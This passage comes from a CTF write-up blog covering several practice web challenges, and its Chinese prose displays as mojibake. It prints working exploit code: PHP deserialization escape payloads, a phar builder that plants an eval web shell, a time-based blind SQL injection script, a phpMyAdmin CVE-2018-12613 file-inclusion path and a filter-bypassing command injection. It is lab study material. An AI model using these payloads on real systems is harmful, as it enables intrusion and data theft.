class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$a=new GetFlag(&quot;bad&quot;);</span></span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="comment">//echo waf(serialize($a));</span></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="string">&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\&quot;;s:3:\&quot;cmd\&quot;;s:4:\&quot;ls /\&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure># [NewStarCTF 2023 å…¬å¼€èµ›é“]PharOnepharååºåˆ—åŒ–å‘ç°æºç ä¸­å­˜åœ¨class.phpæ–‡ä»¶ä¸Šä¼ pharæ–‡ä»¶<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>(); </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;A.phar&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705210529787.png" class="" title="image-20250705210529787">ç›´æ¥ä¸Šä¼ å‘ç°å…¶è¿‡æ»¤æ‰äº†__HALT_COMPILER()ï¼Œ<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705210716993.png" class="" title="image-20250705210716993">gzipå‹ç¼©ç»•è¿‡å‚è€ƒæ–‡ç« [PHP(Phar) ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿](https://ibaiyang.github.io/blog/php/2023/04/13/PHP(Phar)-ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿.html#pharååºåˆ—åŒ–)<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705211012947-1751721014553-3.png" class="" title="image-20250705211012947">å‹ç¼©åä½¿ç”¨jpgåç¼€å³å¯ä¸Šä¼ åä½¿ç”¨pharåè®®è¯»å–æ–‡ä»¶å³å¯æ‰§è¡Œpharæ–‡ä»¶ä¸Šä¼ æœ¨é©¬file=phar://upload/156005c5baf40ff51a327f1c34f2975b.jpg<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706003448663.png" class="" title="image-20250706003448663"># [NewStarCTF 2023 å…¬å¼€èµ›é“]Unserialize Again<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;å¤šåƒé›ªæ¢¨&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>æŸ¥çœ‹æºç ï¼Œå‘ç°åœ¨æœ€åèƒ½è¿‡æ–‡ä»¶ä¸Šä¼ ç›´æ¥å°è¯•é€šè¿‡ä¼ å‚ä¸Šä¼ æ–‡ä»¶<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706093238852.png" class="" title="image-20250706093238852">å‘ç°å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶æ²¡æœ‰è¿‡æ»¤å¹¶ä¸”ä¸Šä¼ æˆåŠŸçš„æœ¨é©¬å¯ä»¥è¢«è§£æ<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706093320998.png" class="" title="image-20250706093320998">åº”è¯¥æ˜¯éé¢„æœŸè§£ï¼Œé¢„æœŸåº”è¯¥é€šè¿‡pharååºåˆ—åŒ–è¿›è¡Œåšé¢˜ã€‚é˜…è¯»ä»£ç å‘ç°åˆ©ç”¨ç‚¹åœ¨<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706091151922.png" class="" title="image-20250706091151922">æ²¡æœ‰unsearsizeè¿™æ ·çš„åˆ©ç”¨ç‚¹<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706091430516.png" class="" title="image-20250706091430516">file_existså¯ä»¥è¢«pharè¿›è¡Œåˆ©ç”¨åˆ©ç”¨gcå›æ”¶æœºåˆ¶ç»•è¿‡weakup<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;ture&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setDefaultStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure># [NewStarCTF 2023 å…¬å¼€èµ›é“]midsqlå°è¯•æ³¨å…¥å‘ç°è¿‡æ»¤äº†ç©ºæ ¼å’Œ=ä½¿ç”¨/**/å’Œlikeè¿›è¡Œç»•è¿‡å³å¯ä½†æ˜¯å‘ç°å…¶æ— å›æ˜¾ï¼Œä½¿ç”¨æ—¶é—´ç›²æ³¨<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e8dc055e-b6d6-46c3-9770-01d66d39ee7d.node5.buuoj.cn:81/?id=&#x27;</span></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        payload = url + <span class="string">f&quot;1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)#&quot;</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(payload).text</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        use_time = end_time - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> use_time &gt; <span class="number">2</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(mid)</span><br><span class="line">    database_name += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(database_name)</span><br></pre></td></tr></table></figure># [GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“#### [phpMyAdmin](https://so.csdn.net/so/search?q=phpMyAdmin&spm=1001.2101.3001.7020) 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å« CVE-2018-12613 æ¼æ´å¤ç°/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flagç›´æ¥è¯»å–flagæ–‡ä»¶[CVE-2018-12613 PhpMyadminåå°æ–‡ä»¶åŒ…å«å¤ç° - åŒ—å­¤æ¸…èŒ¶ã€‚ - åšå®¢å›­](https://www.cnblogs.com/lthlsy/p/14775131.html)å‚è€ƒæ–‡ç« [ThinkPHP]5-Rce[thinkphp 5-rceç‰ˆæœ¬æ¼æ´å¤ç°(è¶…è¯¦ç»†ç‰ˆ)_thinkphp æ¼æ´æ‰«æ-CSDNåšå®¢](https://blog.csdn.net/weixin_44862511/article/details/132132998)æ‰“cveè¿›è¡Œrce# [WUSTCTF2020]æœ´å®æ— åå…ˆæ‰«ç›®å½•æœ‰robots.txtæŸ¥çœ‹å‘ç°å‡çš„flagæŠ“åŒ…å‘ç°å“åº”å¤´ä¸­éšè—è¿™ä¸€ä¸ªé¡µé¢/fl4g.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹ä½ ï¼Œçœ‹æˆ‘çš„åŠ¨åŠ›æ·¡äº†ï¼Œä¸æ˜¯æƒ³çœ‹æ—¶é—´ï¼Œåªæ˜¯æƒ³ä¸ç»æ„é—´è®©ä½ çŸ¥é“æˆ‘æ›¾ç»æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ç”¨é’±è§£å†³ä¸äº†ç©ºè™šäººçš„æœ¬è´¨é—®é¢˜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¸ç®—é—¯å…³&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;æƒ³è¦åœ¨è¿™ä¸ªCTFeræ‹¿åˆ°flagä¹ˆï¼Œæ„è¯†æµæº¢å‡ºï¼Œå‰å¾€ä¸œéƒŠæ‘ï¼Œæ‰¾åˆ°ä¸€å®šçš„çº¿ç´¢ï¼ŒæŠŠæ¨ç†è®²å‡ºå»ï¼Œè‡ªç„¶æœ‰é“ï¼Œæ‰å­¦å¯çªƒ.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;æˆ‘ä»çƒ§çƒ¤æ‘Šçœ‹æˆ‘çš„çœ¼ç¥é‡Œï¼Œçœ‹ä»–æ‰“äº†ä¸ªç”µè¯ï¼ŒæŠŠä»–ä¸€å®šå®‰æ’åˆ°ä¸æ˜¯é—¯å…³çš„äºº&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¸ç®—é—¯å…³&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æƒ³è¦åˆ°è¿™é‡Œï¼Œæˆ‘å¾—å®Œå…¨ç ´é˜²ï¼Œæœ‰é’±äººçš„å¿ƒç†å¤šå¤šå°‘å°‘å°±æ˜¯è¿™æ ·çš„ç©ºè™šæ— èŠï¼Œå¹¶ä¸”è‡ªç§.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;é©¬ä¸Šæ»šå‡ºè€ƒåœº&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¸ç®—é—¯å…³&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-<span class="number">20250707021034112</span>.png image-<span class="number">20250707021034112</span> %&#125;</span><br></pre></td></tr></table></figure>ç¬¬ä¸€å±‚ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ï¼Œç¬¬äºŒå±‚md5è‹¥æ¯”è¾ƒä½¿ç”¨$IFS$9æ¥ç»•è¿‡å¯¹ç©ºæ ¼çš„è¿‡æ»¤?num=11e3&md5=0e215962017&get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag# [BJDCTF2020]Mark loves catdirsearchæ‰«ç›®å½•å‘ç°.gitå¯èƒ½å­˜åœ¨æºç æ³„éœ²ä¸Šç½‘ä½†æ˜¯ä½¿ç”¨githackæ— æ³•æ‹‰å–ä¸‹æ¥æºç ï¼Œå¯èƒ½æ˜¯é¢˜ç›®ç¯å¢ƒé—®é¢˜ä¸Šç½‘æŸ¥æ‰¾æºç <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// åŒ…å«å¤–éƒ¨æ–‡ä»¶ &#x27;flag.php&#x27;ï¼Œå¯èƒ½åŒ…å«å˜é‡ $flag include &#x27;flag.php&#x27;; // åˆå§‹åŒ–ä¸‰ä¸ªå˜é‡ $yds = &quot;dog&quot;;     // $yds è¢«è®¾ç½®ä¸º &quot;dog&quot; $is = &quot;cat&quot;;      // $is è¢«è®¾ç½®ä¸º &quot;cat&quot; $handsome = &#x27;yds&#x27;; // $handsome è¢«è®¾ç½®ä¸ºå­—ç¬¦ä¸² &#x27;yds&#x27; // éå† $_POST æ•°ç»„ï¼Œå°†æ¯ä¸ªé”®å€¼å¯¹èµ‹å€¼ç»™åŠ¨æ€ç”Ÿæˆçš„å˜é‡ foreach($_POST as $x =&gt; $y)&#123;    $$x = $y; // ä¾‹å¦‚ï¼Œå¦‚æœ $_POST åŒ…å« &#x27;foo&#x27; =&gt; &#x27;bar&#x27;ï¼Œåˆ™ç”Ÿæˆ $foo = &#x27;bar&#x27; &#125; // éå† $_GET æ•°ç»„ï¼Œå°†æ¯ä¸ªé”®å€¼å¯¹èµ‹å€¼ç»™åŠ¨æ€ç”Ÿæˆçš„å˜é‡ foreach($_GET as $x =&gt; $y)&#123;    $$x = $$y; // ä¾‹å¦‚ï¼Œå¦‚æœ $_GET åŒ…å« &#x27;foo&#x27; =&gt; &#x27;bar&#x27;ï¼Œåˆ™ç”Ÿæˆ $foo = $bar çš„å€¼ &#125; // å†æ¬¡éå† $_GET æ•°ç»„ï¼Œæ£€æŸ¥ç‰¹å®šæ¡ä»¶ foreach($_GET as $x =&gt; $y)&#123;    // å¦‚æœ $_GET[&#x27;flag&#x27;] çš„å€¼ç­‰äºå½“å‰é”®åä¸”é”®åä¸ä¸º &#x27;flag&#x27;    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;        // è¾“å‡º $handsome çš„å€¼å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ        exit($handsome);    &#125; &#125; // æ£€æŸ¥æ˜¯å¦å­˜åœ¨ $_GET[&#x27;flag&#x27;] æˆ– $_POST[&#x27;flag&#x27;] if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;    // å¦‚æœè¿™ä¸¤ä¸ªå‚æ•°éƒ½æ²¡æœ‰è¢«è®¾ç½®ï¼Œè¾“å‡º $yds çš„å€¼å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ    exit($yds); &#125; // æ£€æŸ¥ $_POST[&#x27;flag&#x27;] æˆ– $_GET[&#x27;flag&#x27;] æ˜¯å¦ç­‰äºå­—ç¬¦ä¸² &#x27;flag&#x27; if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;    // 